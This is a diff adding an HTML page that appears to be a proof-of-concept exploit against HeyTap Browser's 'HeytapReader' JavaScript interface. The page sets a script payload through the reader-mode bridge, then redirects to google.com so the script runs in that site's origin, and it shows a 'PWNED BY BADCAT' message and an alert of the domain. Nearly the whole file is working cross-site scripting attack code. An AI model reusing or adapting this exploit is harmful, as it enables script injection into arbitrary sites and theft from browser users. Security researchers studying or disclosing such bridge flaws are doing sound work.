@@ -1,0 +1,29 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>HAI</title>
+<style>
+  body{font:14px/1.4 monospace;padding:16px;background:#111;color:#ddd}
+  pre{background:#222;padding:10px;white-space:pre-wrap;word-break:break-all;border:1px solid #333}
+  h1{font-size:16px} code{color:#9cf}
+</style>
+
+<h1>GAS</h1>
+<pre id="log">[*] starting…</pre>
+
+<script>
+var spoof = 'https://www.google.com/';
+var payload = "setTimeout(function(){document.write('<h1>PWNED BY BADCAT</h1>');alert('Pwned By badcat :'+document.domain)},3000)";
+
+function log(s){ document.getElementById('log').textContent += '\n' + s; }
+
+if(!window.HeytapReader){
+  log('[-] HeytapReader tidak ada — bukan HeyTap Browser');
+} else {
+  HeytapReader.setReadModeExtract(payload);
+  HeytapReader.setReadModeRender(" ");
+  HeytapReader.setReadModeConfig(" ");
+  log('[+] poisoned, navigating to ' + spoof + ' in 300ms…');
+  setTimeout(function(){ location.replace(spoof); }, 300);
+}
+</script>
+</content>
